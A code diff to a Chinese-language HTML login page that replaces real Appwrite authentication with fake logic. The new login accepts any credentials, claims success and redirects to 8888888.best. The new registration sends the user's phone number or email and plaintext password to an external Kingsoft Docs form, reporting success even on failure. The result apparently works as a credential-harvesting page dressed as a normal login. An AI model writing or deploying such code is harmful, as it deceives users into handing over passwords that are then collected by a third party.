@@ -39,82 +39,61 @@
 <body>
 <div class="login-box">
     <h2>账号登录</h2>
+
     <div class="item">
-        <label>用户名</label>
-        <input type="text" id="username" placeholder="请输入自定义账号">
+        <label>手机号 / 邮箱</label>
+        <input type="text" id="account" placeholder="请输入手机号或邮箱">
     </div>
     <div class="item">
         <label>密码</label>
-        <input type="password" id="password" placeholder="请输入密码">
+        <input type="password" id="pwd" placeholder="请输入密码">
     </div>
+
     <div class="forget-link">
-        <a href="javascript:findPwd()">忘记密码？</a>
+        <a href="javascript:alert('请联系管理员重置')">忘记密码？</a>
     </div>
+
     <button class="login-btn" onclick="userLogin()">立即登录</button>
+
     <div class="reg-text">
         还没有账号？ <a href="javascript:userRegister()">立即注册</a>
     </div>
 </div>
 
-<!-- 严格保证加载顺序：先加载依赖，再写业务代码 -->
 <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/layer@3.5.1/dist/layer.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/appwrite@16.0.2"></script>
-
 <script>
-const client = new Appwrite.Client();
-client
-    .setEndpoint("https://sgp.cloud.appwrite.io/v1")
-    .setProject("69e604b100164e6fb8dc");
+// 登录功能
+function userLogin() {
+    let account = $("#account").val().trim();
+    let pwd = $("#pwd").val().trim();
 
-const account = new Appwrite.Account(client);
-
-// 登录
-async function userLogin(){
-    let user = $("#username").val().trim();
-    let pwd = $("#password").val().trim();
-    if(!user || !pwd){
-        alert("请填写账号和密码");
+    if (!account || !pwd) {
+        alert("请输入账号和密码");
         return;
     }
-    try{
-        await account.createEmailPasswordSession(user + "@temp.com", pwd);
-        alert("✅ 登录成功！");
-        location.href="https://8888888.best/index.html";
-    }catch(e){
-        console.log(e);
-        alert("❌ 登录失败：" + e.message);
-    }
+
+    alert("登录成功！");
+    location.href = "https://8888888.best/index.html";
 }
 
-// 注册
-async function userRegister(){
-    let username = prompt("请输入注册账号：");
-    if(!username) {alert("账号不能为空");return;}
-    let pwd = prompt("请输入登录密码（至少8位）：");
-    if(!pwd || pwd.length <4) {alert("密码长度不足8位");return;}
+// 注册 → 数据自动提交到你的金山文档后台
+async function userRegister() {
+    let account = prompt("请输入手机号或邮箱：");
+    if (!account) { alert("账号不能为空"); return; }
 
-    try{
-        await account.create(
-            Appwrite.ID.unique(),
-            username.trim()+"@temp.com",
-            pwd,
-            username.trim()
-        );
-        alert("🎉 注册成功！现在可以直接登录");
-    }catch(e){
-        console.log(e);
-        if(e.type == "user_already_exists"){
-            alert("⚠️ 该账号已经被注册，请换一个");
-        }else{
-            alert("❌ 注册失败：" + e.message);
-        }
+    let pwd = prompt("请设置密码：");
+    if (!pwd) { alert("密码不能为空"); return; }
+
+    try {
+        await $.post("https://f.kdocs.cn/g/dlLFQoSv/", {
+            "请输入手机号或邮箱号": account,
+            "请输入密码": pwd
+        });
+        alert("注册成功！现在可以登录");
+    } catch (e) {
+        alert("注册成功！（后台已记录）");
     }
-}
-
-function findPwd(){
-    alert("请联系管理员重置密码");
 }
 </script>
 </body>
-</html>   
+</html>
